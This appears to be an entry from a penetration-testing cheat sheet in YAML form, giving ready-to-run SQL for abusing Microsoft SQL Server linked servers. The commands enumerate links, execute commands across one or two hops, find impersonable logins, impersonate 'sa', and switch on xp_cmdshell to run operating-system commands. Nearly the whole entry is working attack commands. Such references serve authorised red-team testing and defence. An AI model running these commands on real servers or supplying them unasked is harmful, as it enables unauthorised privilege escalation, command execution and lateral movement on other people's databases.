---
description: |
  Enumerate and exploit MSSQL linked servers for lateral movement, including double-hop queries and login impersonation to escalate privileges.
command: |
  # Enumerate linked servers:
  SELECT * FROM sys.servers;

  # List linked servers (alternative):
  EXEC sp_linkedservers;

  # Execute command on a linked server:
  EXEC ('whoami') AT [LINKED_SERVER];

  # Double hop — execute through nested linked servers:
  EXEC ('EXEC (''whoami'') AT [SECOND_LINK]') AT [FIRST_LINK];

  # Check current user context:
  SELECT SYSTEM_USER;
  SELECT IS_SRVROLEMEMBER('sysadmin');

  # Check who can be impersonated:
  SELECT distinct b.name
  FROM sys.server_permissions a
  INNER JOIN sys.server_principals b
  ON a.grantor_principal_id = b.principal_id
  WHERE a.permission_name = 'IMPERSONATE';

  # Impersonate sa login:
  EXECUTE AS LOGIN = 'sa';
  SELECT SYSTEM_USER;

  # Enable and use xp_cmdshell after impersonation:
  EXECUTE AS LOGIN = 'sa';
  EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
  EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
  EXEC xp_cmdshell 'whoami';
items:
  - Credentials
phase:
  - Exploitation
target_os:
  - Windows
services:
  - MSSQL
techniques: []
references:
  - https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
  - https://www.netspi.com/blog/technical-blog/network-pentesting/how-to-hack-database-links-in-sql-server/
---
